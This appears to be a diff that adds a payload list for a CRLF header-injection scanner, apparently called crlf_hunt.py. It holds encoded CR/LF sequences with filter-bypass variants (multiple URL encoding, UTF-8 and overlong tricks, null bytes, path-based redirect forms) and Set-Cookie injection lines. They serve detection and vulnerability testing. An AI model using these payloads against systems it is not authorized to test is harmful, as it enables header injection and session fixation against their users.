@@ -1,0 +1,75 @@
+# Holistic CRLF detection payloads for crlf_hunt.py
+# {T} is replaced at runtime with a unique random token.
+# A hit = the token appears in a RESPONSE HEADER (name or value),
+# which proves the CR/LF was interpreted. Body-only reflection is ignored.
+# Sources folded in: payload-box, PortSwigger, CRLFsuite, Proviesec, PayloadsAllTheThings.
+
+# --- basic sequences ---
+%0d%0aX-Crlf:{T}
+%0aX-Crlf:{T}
+%0dX-Crlf:{T}
+%0D%0AX-Crlf:{T}
+%0D%0A%0D%0AX-Crlf:{T}
+
+# --- header name carries the token (strong signal) ---
+%0d%0aX-Crlf-{T}:1
+%0aX-Crlf-{T}:1
+
+# --- whitespace / tab prefixes (parser quirks) ---
+%0d%0a%20X-Crlf:{T}
+%0d%0a%09X-Crlf:{T}
+%0d%0a%20%20X-Crlf:{T}
+%20%0d%0aX-Crlf:{T}
+%09%0d%0aX-Crlf:{T}
+
+# --- double / triple URL encoding (filter bypass) ---
+%250d%250aX-Crlf:{T}
+%25250d%25250aX-Crlf:{T}
+%%0d0d%%0a0aX-Crlf:{T}
+%25%30%64%25%30%61X-Crlf:{T}
+%250aX-Crlf:{T}
+
+# --- UTF-8 / Firefox strip trick (嘊嘍) and overlong ---
+%E5%98%8A%E5%98%8DX-Crlf:{T}
+%E5%98%8DX-Crlf:{T}
+%E5%98%8AX-Crlf:{T}
+%C4%8D%C4%8AX-Crlf:{T}
+%c0%8d%c0%8aX-Crlf:{T}
+%e0%80%8d%e0%80%8aX-Crlf:{T}
+
+# --- unicode / JS unicode ---
+%u000d%u000aX-Crlf:{T}
+%u000aX-Crlf:{T}
+%u000dX-Crlf:{T}
+
+# --- null byte combinations ---
+%00%0d%0aX-Crlf:{T}
+%0d%0a%00X-Crlf:{T}
+%uff00%0d%0aX-Crlf:{T}
+%ef%bb%bf%0d%0aX-Crlf:{T}
+
+# --- special-char prefixes that terminate the original value ---
+%23%0d%0aX-Crlf:{T}
+%3f%0d%0aX-Crlf:{T}
+%26%0d%0aX-Crlf:{T}
+%3d%0d%0aX-Crlf:{T}
+%3b%0d%0aX-Crlf:{T}
+
+# --- path-based (redirect/location params) ---
+/%0d%0aX-Crlf:{T}
+/%2e%2e%2f%0d%0aX-Crlf:{T}
+/%2f..%0d%0aX-Crlf:{T}
+%2f%0d%0aX-Crlf:{T}
+//example.com/%2f%2e%2e%0d%0aX-Crlf:{T}
+
+# --- Set-Cookie variant (session-fixation surface; token in value) ---
+%0d%0aSet-Cookie:crlf={T}
+%0aSet-Cookie:crlf={T}
+%23%0d%0aSet-Cookie:crlf={T}
+%E5%98%8A%E5%98%8DSet-Cookie:crlf={T}
+
+# --- Proviesec marker style ---
+crlf%0d%0aX-Crlf:{T}
+crlf%0d%20X-Crlf:{T}
+crlf%20%0dX-Crlf:{T}
+crlf%E5%98%8A%E5%98%8DX-Crlf:{T}
